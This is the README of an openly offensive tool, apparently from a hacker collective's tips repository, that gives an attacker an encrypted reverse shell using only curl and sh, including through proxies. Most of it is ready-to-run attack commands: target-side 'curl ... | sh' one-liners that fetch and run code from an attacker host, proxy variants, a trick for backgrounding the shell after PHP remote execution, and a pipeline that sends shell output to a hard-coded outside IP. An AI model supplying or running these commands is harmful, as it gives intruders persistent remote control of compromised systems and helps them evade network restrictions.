# Reverse shell using curl

(Cloned from [https://github.com/irsl/curlshell](https://github.com/irsl/curlshell); slightly enhanced)

An encrypted reverse TCP shell through a proxy (using only cURL).

It allows an attacker to access a remote shell (sh) when the remote system can access the Internet via a Proxy only (or the filesystem is mounted read-only/noexec). The target only needs to have `curl` and `sh` installed. Python is not needed and no additonal tools are installed or deployed.


Generate a SSL Certificate (on your system; not the target):
```sh
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
```

## Without Proxy

```sh
# Start your listener (your system)
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
```sh
# On the target:
curl -skfL https://1.2.3.4:8080 | sh
```

## With SOCKS Proxy
```sh
./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | sh
```

## With HTTP Proxy
```sh
./curlshell.py -x http://5.5.5.5:3128 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | sh
```

## With HTTP (plaintext)
```sh
./curlshell.py --listen-port 8080
```
```sh
curl -sfL http://1.2.3.4:8080 | sh
```

# Advanced Tricks
**Trick #1 - Spawn a TTY shell**
```sh
stty intr undef ;
./curlshell.py --shell "script -qc '/bin/bash -il' /dev/null" --listen-port 8080 ; stty intr ^C
```

**Trick #2 - Start the reverse shell as a daemon / background process**  
This is useful when you have remote execution via PHP:
```sh
# On the target:
(curl -sfL http://1.2.3.4:8080 | sh &>/dev/null &)
```

# How it works
The first cURL request pipes this into a target's shell:
```sh
exec curl -X POST -sN http://217.138.219.220:30903/input \
    | sh 2>&1 | curl -s -T - http://217.138.219.220:30903/stdout
```

This command starts two cURL processes and connects another shell's input and output these two cURL. HTTP's 'chunked transfer' (`-T`) does the rest.

---
More at https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet.

Join us on Telegram: https://t.me/thcorg